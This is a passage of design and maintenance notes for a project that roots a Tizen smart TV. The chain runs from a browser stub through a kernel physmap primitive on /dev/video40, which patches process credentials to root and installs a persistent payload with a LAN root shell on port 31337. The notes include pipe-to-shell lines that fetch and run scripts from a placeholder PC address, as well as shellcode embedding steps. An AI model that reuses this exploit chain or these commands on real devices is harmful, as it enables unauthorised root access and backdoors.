  itself a hole (Linux 5.4 unmaps the slot before the driver's mmap can fail):
  v30 restores it with `MAP_FIXED_NOREPLACE` before the plain fallback, beacons
  once, and turns the window off if the hole cannot be restored. `ReleasePage`
  checks its re-protect and does the same. Keep the plain-mmap fallback and the
  one-time `physmap window …` beacon.
- **CredScanNear (v28, budget corrected in v30):** the content-scan fallback
  patches sane uid-5001 creds near the child's cred (±1 MiB, lower addresses
  first, child's own excluded, `getuid()` stop) while the child's cred page
  reads 5001 — cred pages reading stale make it pointless. The 8-cred patch
  budget is PROCESS-WIDE (`_scanPatched`), not per call; the scan runs only in
  rounds that follow a wait, so early in-window scans cannot spend it before
  the post-window round that can see ours. A pattern at page offset 0-3 is
  skipped without aborting the rest of the page. Beacons: `cred-scan … total=`.
- **Fast-mode rounds (v29→v33):** `{0, 0, 5000, 5000}` — the v31 10 s last wait
  was reverted after its cold boot regressed (132 s). Attempt 1 is an allocation
  lottery: high task/cred reads are garbage, so waiting cannot help; v33's
  `high-alloc` gate (fast mode only) fast-exits instead of spending the waits.
  Only a fresh process re-rolls the address. The fast PHYSRPT scan is 2 tries;
  keep the fast-exit as the final fallback.
- **HighAllocProbe (v38, read-only):** the `high-scan` diagnostic runs ONLY in
  the fast-mode high-alloc gate branch, right before the fast-exit, under its
  own 2.5 s stopwatch, and never writes (`Write32`/`PatchCred` untouched).
  Tasks are NOT page-aligned (0xe2df7300 = page offset 0x300): it reads the
  comm at the translated parent ADDRESS itself (`verdict=linear`), and the
  sweep finds the comm at any offset (NUL follow-byte checked across the page
  edge), accepting a candidate only when its children list (task+0x2F8) links
  `&child->sibling` (child+0x300, DWARF-confirmed). The sweep stays inside
  `0x20000000..0x40000000`; the translated page (`0x40000000..0x5FFFFFFF`) is
  point-read only — the access class the direct-probe `phead=`/`pplain=` lines
  have used since v28. Do not wire it into the success path, widen the sweep
  past proven RAM, or let it grow past the budget. Verdicts and how to read
  them: `docs/OPEN-ISSUES.md` → Pending.
- `ReopenVideo()` after `FindBase` / `TaskOffsets` and **before** `fork()` (sole
  opener in this process). Never close the node while a landmark child still holds it.
- Latch **every** new `PHYRFORK` not in `pre` (v23): parent-cred uid 5001, 0,
  unreadable and live foreign all take the same `maybe` path. `PatchCred` still
  writes uid 5001 only. Do not restore the v21/v22 "skip a live foreign uid"
  rule — a stale word can look foreign, and that skip is what lost attempt 1.
- `SIGKILL` landmark children before `Environment.Exit` and after a successful
  root, before `RootChannel()`.
- `Beacon()` keeps the `t=<uptime>s` prefix.
- **Builds are reproducible since v17.** The csproj pins
  `IncludeSourceRevisionInInformationalVersion=false`; before that the SDK
  embedded the git SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the
  same source built to a different md5 at every commit. Two clean builds of the
  same source now produce the same artifact (comments never entered the IL).
  After a payload change: copy `payload/out/MultiControlService.dll` over
  `server/payload.dll`; the deploy gate is rendered from that file, so there is
  no `WANT=` to update by hand.
- **v41 hardening to preserve:** the device open retries **video40** on
  `EBUSY` for the whole budget and advances to `video30`/`video60` only on
  `ENOENT`/`ENODEV`, beaconing on state change plus one "still waiting" line per
  30 s (never per attempt, never at 1 s); `Run()` uses a unique temp file per
  call, passes the command as an argument (not spliced into `-c`), caps the
  redirect file with `ulimit -f 2048` (tmpfs!; measured 2 MiB on this busybox), caps the read at 1 MiB and times
  out at 120 s; `Write32` splits a page-crossing word byte-wise; the failure
  paths and long-mode idle close the device; `RootChannel` retries a failed bind
  and stops the listener that threw; auto-update-off runs on a background
  thread; capability writes happen **only** after an ids write that started from
  uid 5001; a failed reopen names `_node`, not a hardcoded video40.  **v41:** the
  payload reads `rootchan.token` (deploy-rendered, 0644) and prefixes every
  beacon with `tok=`; the server refuses an unknown token and never admits a
  token-less beacon to the shell slot.

## 10. Recovery

- **Payload fails to root at boot, channel down:** the browser path still works.
  Load `index.html` and run `root.ps1` again — or, from a root shell,
  `server/recover.sh`. If every physmap node is held by the failed payload, wait
  (~2 min, it exits and now closes the node) or power-cycle.
- **Restore stock app / uninstall:** `pwsh -File uninstall.ps1 -TvIp <tv-ip>`. It
  uses the 31337 channel to run `server/uninstall.sh`, which md5-checks and
  restores the stock IL + AOT (relabelled), deletes the boot row unless
  `-KeepBoot`, and verifies the table. It then waits through the reboot and
  confirms 31337 stays closed — **the power-cycle is yours to do**, the script
  only waits for it. Manual fallback if the channel is down: load `index.html`,
  `kernel_root.py --fork`, then
  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh" 120` (the default
  wait is 3 s, far too short).
- **Backups on the TV:** `mcs_orig.dll` (original IL),
  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`.
  `payload_backup.dll` is whatever was in `bin/` before the last deploy — it is
  **not** guaranteed to be stock, so uninstall never uses it (it restores from
  `mcs_orig.dll` and checks the md5).
- **Browser stub rebuild:** `tools/physrpc.S` + `tools/build_physrpc.py`, then
  `tools/embed_physrpc.py` (no manual paste; it refuses a staging overflow). Both
  `--check` modes must pass before a page test.

## 11. Open work

- ~~Bind 31337 to a single address~~ — **done in v16**: the listener binds the TV address derived from the route to the recorded PC (re-derived every 30 s, `Any` fallback with a beacon if there is no route), so it is off Wi-Fi Direct/tethering while staying portable. `/proc/net/tcp` shows the TV's own address on 31337, not `00000000:7A69`.
- **High-half read mechanism — boundary corrected by zoneinfo; DMA window suspect.**
  `/proc/zoneinfo` has Normal `start_pfn 0x20000`, HighMem `start_pfn 0x50400`,
  so `high_memory` is **VA `0xF0400000`**; `meminfo` is vendor-adjusted, which is
  why the earlier `0xE4E42000` estimate was wrong. The `0xE0000000` read failures
  are inside the map and point at the video40 DMA window (~512 MiB, matching
  "reads past 0x46000000 hang"). One deliberate high-PA read and a re-read of the
  v38 `high-scan` verdicts against `0xF0400000` are still worth doing; neither
  blocks attempt 2.
- **Pending: portability.** No second model/firmware has been tested. Use the
  four gates and the file-by-file checklist in `docs/PORTABILITY.md`; record each
  unit there.
- ~~Validate the `root.ps1` auto-root retry from stock~~ — **done 2026-10-25.**
  The stock cycle failed on attempt 1 with `probe 0x40008000 timed out`;
  `auto_root` requested a reload, `RSET` the gateway, waited for the fresh stub,
  and attempt 2 rooted and deployed v37 (`COPY=ok`). The following cold boot
  rooted at t=37. The retry prompt is the manual fresh-page recovery, automated.
- **31337 is still a LAN root shell for allowlisted peers.** The allowlist is
  the only filter on the channel itself. Both handshakes are now token-gated:
  the `PGDB` stub pairing (v40, live 2026-10-27, `c7eeacdb`) and every `DSHROOT`
  beacon (v41, live 2026-10-27, `tok=c1eadc03` from `rootchan.token`); unknown
  tokens are refused and token-less beacons never join `TV_PEERS`. Residual: a
  peer that is on the allowlist can still connect to 31337. Keep the set off
  untrusted networks; see `SECURITY.md`.
- **~~Public-release maintenance~~ - done 2026-10-27.** The baked addresses are
  TEST-NET placeholders (`192.0.2.1`) and `tools/sanitize_for_public.py --check`
  passes on the tree. Re-run it before publishing; keep `server/deploy.sh`'s
  markers intact.
- ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
  READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
  two ops whose payload would desync the stream; v39 added NUL termination and
  moved the RUN/FILE caps to 511/255, so the blob is now 7,720 B (v40 added the
  pairing token word and the early 8-byte `PGDB`+token send; rebuilt and
  re-embedded; both `--check` modes green, live-verified earlier by
  `tools/test_stub.py` — re-run `--tv` after one fresh page load).
- ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
  (120 s retry), so a browser stub holding the device no longer costs a cycle.
- ~~Replace the task-list walk with a list-independent locator~~ — **done**: `tools/scan_cred.py` finds creds by content
  (`ids = 5001,100 ×4` at `cred+4`, refcount-checked) and patches them; 253
  creds were rooted in one pass with no task list at all. The walk is still used
  when it happens to work (fresh stub), and the pid-hash/IDR routes remain
  blocked for the reasons recorded below.
  pid-hash and IDR locators are both blocked on this kernel (no kallsyms, and
  `init_pid_ns` has no `idr` field) — the cred-content scan above made them
  unnecessary. Full reasoning: `docs/SCRIPT-REVIEW.md`.
- ~~Automate re-embedding the shellcode in `browser_payload.js` after a rebuild~~
  — **done**: `tools/embed_physrpc.py` writes the blob into the page (refusing a
  staging overflow) and `--check` proves page == blob; `build_physrpc.py
  --check-embedded` proves blob == `physrpc.S`.
- Re-measure offsets on other Tizen 9 models; the physmap primitive may be
  shared even where the constants differ.

Removed in v34, deliberately: the `next.dll` self-update (an unauthenticated
payload-replacement path), the remote/hotkey research (`docs/REMOTE.md` and
`tools/tv_ws_launch.py`), and the OTA-measurement task (running an OTA against a
rooted set risks the root; the warning to keep auto-update off remains).

### Caveats for a fresh clone

- **`server/deploy.sh` is a template, not a script to serve from disk.** `H=@HOST@`,
  `WANT=@WANT@`, `SIZE_WANT=@SIZE@` and `@BEACON_TOKEN@` are rendered by `server.py` per request
  (the address the TV used + the hash/size of the `payload.dll` actually served).
  A static server leaves the markers in place and the script refuses with
  `NEED_RENDER`; there is no generated `deploy_local.sh` any more.
- **Compiled address fallbacks are TEST-NET placeholders now.** `payload/Program.cs`
  has `Host = "192.0.2.1"`, and the shellcode ships `192.0.2.1:80`; the real
  address comes from `rootchan.host` (deploy) and from the page (which patches
  **IP and port**, and aborts when served by hostname). Open the page by **IPv4**.
- **31337 is an unauthenticated LAN root shell.** The allowlist is the only
  filter; see `SECURITY.md`.
- **Attempt 1 after a cold boot is a lowmem-placement lottery.** Do not chase it with
  waits (v31: 132 s); the high-half read limit is in §1 and trap 16.
- **Do not re-add the v34 removals without a design.** A `next.dll` update needs
  a pinned hash or auth; remote/OTA work is out of scope.
- **Third-party browser chain is not covered by `LICENSE`.** See `NOTICE.md`
  before redistributing.

## 12. Safety rules

- Only on hardware you own. A bad physical write can brick the TV.
- One change at a time; verify with `root_shell.py` after each.
- Never overwrite unknown system files; keep the backups.
- The root channel is unauthenticated: treat it as a LAN-wide root backdoor.

* **Recovery:** `server/recover.sh` — paste it into a root shell on the TV
  (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
  takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
  `deploy.sh` restarts the app so the new DLL loads. Verified on
  a cold boot (v37: 37 s; v34: 34 s, and 68 s on the stock cycle).